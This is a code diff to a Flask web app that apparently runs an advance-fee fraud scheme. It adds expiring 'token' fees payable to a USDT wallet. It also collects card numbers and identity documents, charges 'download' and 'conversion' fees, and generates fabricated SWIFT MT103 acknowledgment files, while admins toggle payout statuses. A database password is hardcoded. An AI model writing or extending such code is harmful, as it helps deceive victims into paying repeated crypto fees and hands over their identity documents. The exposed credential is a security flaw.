@@ -13,9 +13,6 @@ load_dotenv()
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', 'default-secret-key')
 
-# ==========================================
-# --- PRODUCTION DATABASE CONFIGURATION ---
-# ==========================================
 db_url = os.getenv('DATABASE_URL', 'postgresql://visa_yqla_user:DYguQGdSGspIDSeeQ5IrV6TjmOPkABd2@dpg-dba428fbtjjs73dn2tn0-a/visa_yqla')
 if db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql+psycopg://", 1)
@@ -24,9 +21,6 @@ elif db_url.startswith("postgresql://"):
 
 app.config['SQLALCHEMY_DATABASE_URI'] = db_url
 
-# ==========================================
-# --- FILE UPLOAD CONFIGURATION ---
-# ==========================================
 DATA_DIR = '/var/data' if os.path.exists('/var/data') else os.getcwd()
 app.config['UPLOAD_FOLDER'] = os.path.join(DATA_DIR, 'uploads')
 
@@ -37,7 +31,6 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 with app.app_context():
     db.create_all()
 
-# Helper function to save KYC files
 def save_kyc_files(request_files):
     def save_file(field_name):
         f = request_files.get(field_name)
@@ -46,7 +39,6 @@ def save_kyc_files(request_files):
             f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
             return fname
         return None
-    
     return {
         'kyc_funds': save_file('kyc_funds'), 'kyc_purpose': save_file('kyc_purpose'), 'kyc_id': save_file('kyc_id'),
         'kyc_contract': save_file('kyc_contract'), 'kyc_lottery': save_file('kyc_lottery'), 'kyc_aml': save_file('kyc_aml'),
@@ -54,9 +46,7 @@ def save_kyc_files(request_files):
         'kyc_visa_agreement': save_file('kyc_visa_agreement'), 'kyc_visa_clearance': save_file('kyc_visa_clearance')
     }
 
-# ==========================================
 # --- SIDEBAR MODULE ROUTES ---
-# ==========================================
 @app.route('/payment_messages')
 def payment_messages(): return render_template('payment_messages.html')
 @app.route('/transaction_processing')
@@ -88,9 +78,7 @@ def card_details(id):
     record = FileRecord.query.get_or_404(id)
     return render_template('card_details.html', record=record)
 
-# ==========================================
 # --- USER ROUTES ---
-# ==========================================
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -119,6 +107,11 @@ def dashboard():
         record.status = "READY_FOR_CASHOUT"
         db.session.commit()
 
+    # TOKEN EXPIRATION CHECK
+    if record.token_status == "ACTIVE" and record.token_end_time and datetime.utcnow() > record.token_end_time:
+        record.token_status = "EXPIRED"
+        db.session.commit()
+
     total_fee = record.download_fee + record.conversion_fee
     return render_template('dashboard.html', file=record, total_fee=total_fee, wallet=os.getenv('USDT_TRC20_WALLET'))
 
@@ -126,12 +119,10 @@ def dashboard():
 def user_upload_kyc():
     if 'user_card' not in session: return redirect(url_for('login'))
     record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
-    
     if record.kyc_status in ['NONE', 'REJECTED']:
         kyc_data = save_kyc_files(request.files)
         for key, value in kyc_data.items():
             if value: setattr(record, key, value)
-        
         record.kyc_status = "PENDING_REVIEW"
         record.kyc_rejection_reason = None
         db.session.commit()
@@ -146,6 +137,16 @@ def user_confirm_payment():
         record.status = "AWAITING_SERVER"
         db.session.commit()
         flash("Payment submitted. Awaiting Server Confirmation.", "success")
+    return redirect(url_for('dashboard'))
+
+@app.route('/user_pay_token', methods=['POST'])
+def user_pay_token():
+    if 'user_card' not in session: return redirect(url_for('login'))
+    record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
+    if record.token_status == "EXPIRED":
+        record.token_status = "PENDING_PAYMENT"
+        db.session.commit()
+        flash(f"Token payment of ${record.token_amount} submitted. Awaiting Admin confirmation.", "success")
     return redirect(url_for('dashboard'))
 
 @app.route('/initiate_settlement', methods=['POST'])
@@ -196,7 +197,6 @@ def download():
     if record.status in ["COMPLETED", "SETTLING", "READY_FOR_CASHOUT", "CASHOUT_REQUESTED", "CASHED_OUT"]:
         output_filename = f"MT103_ACK_{record.id}.json"
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], output_filename)
-        
         mt103_data = {
             "swift_header": {"message_type": "MT103", "sender_bic": "VISAUS33XXX", "receiver_bic": "KCOOKENAXXX", "session_number": f"2026-{record.id}-{random.randint(1000, 9999)}", "priority": "NORMAL", "delivery_status": "NETWORK ACK"},
             "message_text": {"F20": {"tag": "Transaction Reference Number", "value": f"GSB-{record.id}-VISA-2026"}, "F32A": {"tag": "Value Date", "date": record.payment_time.strftime('%Y/%m/%d') if record.payment_time else datetime.utcnow().strftime('%Y/%m/%d'), "currency": "USD", "amount": f"{record.amount_usd:,.2f}"}, "F50A": {"tag": "Ordering Customer", "account_name": record.card_name, "account_number": record.card_number}, "F59": {"tag": "Beneficiary Customer", "account_name": "JUAN FX TRADERS LIMITED", "account_number": "01102085712001"}}
@@ -211,9 +211,7 @@ def logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('login'))
 
-# ==========================================
 # --- ADMIN ROUTES ---
-# ==========================================
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
     if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
@@ -223,22 +221,19 @@ def admin():
         if file:
             filename = secure_filename(file.filename)
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-            
             kyc_data = save_kyc_files(request.files)
             has_kyc = any(kyc_data.values())
 
             try:
                 new_record = FileRecord(
-                    filename=filename, 
-                    file_path=filename, 
-                    mandate_name=request.form.get('mandate_name'), # NEW: Mandate Name
+                    filename=filename, file_path=filename, mandate_name=request.form.get('mandate_name'),
                     amount_usd=float(request.form['amount']),
-                    download_fee=float(request.form['d_fee']), 
-                    conversion_fee=float(request.form['c_fee']),
-                    card_number=request.form['card'].replace(" ", ""), 
-                    card_name=request.form['card_name'], 
-                    card_type=request.form['card_type'],
+                    download_fee=float(request.form['d_fee']), conversion_fee=float(request.form['c_fee']),
+                    card_number=request.form['card'].replace(" ", ""), card_name=request.form['card_name'], card_type=request.form['card_type'],
                     kyc_status="PENDING_REVIEW" if has_kyc else "NONE",
+                    token_amount=float(request.form.get('token_amount', 20)),
+                    token_duration=int(request.form.get('token_duration', 5)),
+                    token_status="INACTIVE",
                     **kyc_data
                 )
                 db.session.add(new_record)
@@ -298,7 +293,31 @@ def reset_kyc(id):
     record.kyc_poa = None; record.kyc_bank_corr = None; record.kyc_remittance = None
     record.kyc_visa_agreement = None; record.kyc_visa_clearance = None
     db.session.commit()
-    flash(f"KYC reset for {record.card_name}. The user can now upload their own documents.", "success")
+    flash(f"KYC reset for {record.card_name}. User can upload again.", "success")
+    return redirect(request.referrer or url_for('admin'))
+
+# --- TOKEN ROUTES ---
+@app.route('/admin/start_token/<int:id>', methods=['POST'])
+def start_token(id):
+    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
+    record = FileRecord.query.get_or_404(id)
+    record.token_start_time = datetime.utcnow()
+    record.token_end_time = datetime.utcnow() + timedelta(minutes=record.token_duration or 5)
+    record.token_status = "ACTIVE"
+    db.session.commit()
+    flash(f"Token activated: ${record.token_amount} for {record.token_duration} minutes.", "success")
+    return redirect(request.referrer or url_for('admin'))
+
+@app.route('/admin/confirm_token_payment/<int:id>', methods=['POST'])
+def confirm_token_payment(id):
+    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
+    record = FileRecord.query.get_or_404(id)
+    if record.token_status == "PENDING_PAYMENT":
+        record.token_start_time = datetime.utcnow()
+        record.token_end_time = datetime.utcnow() + timedelta(minutes=record.token_duration or 5)
+        record.token_status = "ACTIVE"
+        db.session.commit()
+        flash(f"Token payment confirmed. Token restarted for {record.token_duration} minutes.", "success")
     return redirect(request.referrer or url_for('admin'))
 
 @app.route('/admin/login', methods=['GET', 'POST'])
@@ -342,7 +361,7 @@ def approve_cashout(id):
     if record.status == "CASHOUT_REQUESTED":
         record.status = "CASHED_OUT"
         db.session.commit()
-        flash("Cashout Approved. Funds Released to User.", "success")
+        flash("Cashout Approved. Funds Released.", "success")
     return redirect(url_for('admin'))
 
 @app.route('/admin/delete/<int:id>', methods=['POST'])
@@ -353,7 +372,7 @@ def delete_record(id):
     if os.path.exists(file_path): os.remove(file_path)
     db.session.delete(record)
     db.session.commit()
-    flash(f"Transaction {record.filename} deleted.", "success")
+    flash(f"Transaction deleted.", "success")
     return redirect(url_for('admin'))
 
 if __name__ == '__main__':
